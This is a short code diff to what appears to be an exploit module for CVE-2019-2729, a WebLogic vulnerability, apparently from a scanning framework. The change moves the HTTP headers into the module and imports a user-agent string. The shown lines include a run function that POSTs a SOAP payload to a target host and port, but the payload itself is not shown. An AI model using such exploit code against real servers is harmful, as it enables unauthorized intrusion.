@@ -11,10 +11,9 @@
 
 import sys
 import time
-
 import requests
 
-from config.config_requests import headers
+from config.config_requests import ua
 
 VUL=['CVE-2019-2729']
 
@@ -3543,6 +3542,12 @@ payload2 = '''
 </soapenv:Envelope>
 '''
 
+
+headers = {
+    "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8",
+    "User-Agent":ua,
+    "Content-Type":"text/xml"
+}
 
 def run(rip,rport):
     r1 = requests.post('http://' + str(rip) + ':' + str(rport) + path1, headers=headers, data=payload1, timeout=3)
